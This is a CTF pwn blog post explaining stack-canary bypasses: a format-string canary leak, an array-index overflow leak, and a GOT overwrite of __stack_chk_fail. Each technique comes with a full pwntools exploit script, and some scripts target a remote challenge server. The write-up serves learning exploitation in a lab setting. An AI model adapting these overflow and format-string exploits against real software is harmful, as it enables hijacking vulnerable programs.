---
title: 「PWN」canary的绕过和泄露思路
description: nova在其博客中探讨了Canary值的泄露和绕过的技术。首先，他简要介绍了如何通过格式化字符串来泄露Canary值。以一个包含格式化字符串漏洞的题目为例，通过GDB，他发现Canary在字符串的第七个参数位置，并通过任意地址读取Canary。
pubDate: 2022-01-16
tags:
- CTF
- Pwn
authors:
- nova

---
Ready to study the bypass under different protection mechanisms before diving into the heap.

Let's take a look at Canary today

{/* truncate */}

# Leak Canary

One of the main ways to bypass Canary is to leak the value of Canary, usually through formatting strings or some output from the question.

## bin

This is a basic question that leaks Canary through format strings

![pseudocode](https://oss.nova.gal/img/image-20220116194731361.png)

![checksec](https://oss.nova.gal/img/image-20220116195013327.png)

At the same time, there is a backdoor function `cat flag`, so we only need to leak the value of the canary, and overflow to the backdoor function.

By observing GDB, we see that the canary is at the seventh parameter position of the string, directly read canary from any address.

exp:

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'i386'
context.os = 'linux'

sh = process('./bin')

payload = b'%7$x'
# gdb.attach(sh, 'b printf')
sh.sendline(payload)
canary = int(sh.recv(), 16)
print(canary)
getflag_addr = 0x0804863B
payload = b'A'*100 + p32(canary) + b'A'*12 + p32(getflag_addr)
sh.sendline(payload)
sh.interactive()

```

## pwn1

This utilizes knowledge of array index overflow, but the essence is the same.

By overflowing the array index to modify its upper limit judgment, then leaking canary.

(Testers believed that it should be possible to directly modify the array index to the return address, directly modifying the return address, but had not figured it out yet. While writing the script, it segfaulted, and even changing it back did not work. The programmer's question +1.)

Two exp are provided.

exp1:

```python
from pwn import *
context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

# sh = process("./calc")
sh = remote('pwn.nos4fe.site', 10000)

sh.recvuntil(b'Your choice:')
sh.sendline(b'1')
sh.recvuntil(b'Please input the pos:')
sh.sendline(b'-2')
sh.recvuntil(b'Please input the number:')
sh.sendline(b'1000')

for i in range(23):
    sh.recvuntil(b'Your choice:')
    sh.sendline(b'1')
    sh.recvuntil(b'Please input the pos:')
    sh.sendline(b'%d' % i)
    sh.recvuntil(b'Please input the number:')
    sh.sendline(b'0')

#gdb.attach(sh, 'b puts')


sh.recvuntil(b'Your choice:')
sh.sendline(b'2')
sh.recvuntil(b'How many?')
sh.sendline(b'24')
sh.recvuntil(b"result:")
canary = int(sh.recvline())
calc_root_addr = int(0x4012BD)
sh.recvuntil(b'Your choice:')
sh.sendline(b'3')
sh.recvuntil(b"What's your name?")
payload = b'A'*(0x20-0x08) + p64(canary) + b'A'*0x08 + p64(calc_root_addr)
sh.sendline(payload)
sh.interactive()

```

exp2:

```python
from pwn import *
context.log_level='DEBUG'
context.arch='amd64'
context.os='linux'

#sh = process("./calc")
sh = remote('pwn.nos4fe.site', 10000)

sh.recvuntil(b'Your choice:')
sh.sendline(b'1')
sh.recvuntil(b'Please input the pos:')
sh.sendline(b'-2')
sh.recvuntil(b'Please input the number:')
sh.sendline(b'1000')


sh.recvuntil(b'Your choice:')
sh.sendline(b'1')
sh.recvuntil(b'Please input the pos:')
sh.sendline(b'25')
#gdb.attach(sh, 'b puts')
sh.recvuntil(b'Please input the number:')
sh.sendline(b'4199101')

sh.recvuntil(b'Your choice:')
sh.sendline(b'3')
sh.sendline(b'')
sh.interactive()
```

# Hijack stack_chk_fail

Modify the `stack_chk_fail` function's got address, so that it directly jumps to the backdoor function when executed.

Then stack overflow.

Mainly relying on formatting strings to write to arbitrary addresses (making people doubt life)

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

sh = process('./bin3')
elf = ELF('./bin3')

stack_chk_fail_got = elf.got['__stack_chk_fail']
backdoor_addr = 0x040084E

payload = fmtstr_payload(6, {stack_chk_fail_got: backdoor_addr})
print(payload)
sh.sendline(payload + b'A'*0x100)
sh.interactive()

```

> By the way, I actually don't quite understand the large number coverage of fmtstr, but pwntools unexpectedly provides `fmtstr_payload` to calculate for you, which is great

# Brute-Force

Forking a process will keep the canary constant, making it possible to brute force.

~~Haven't found the question yet~~

{/* AI */}
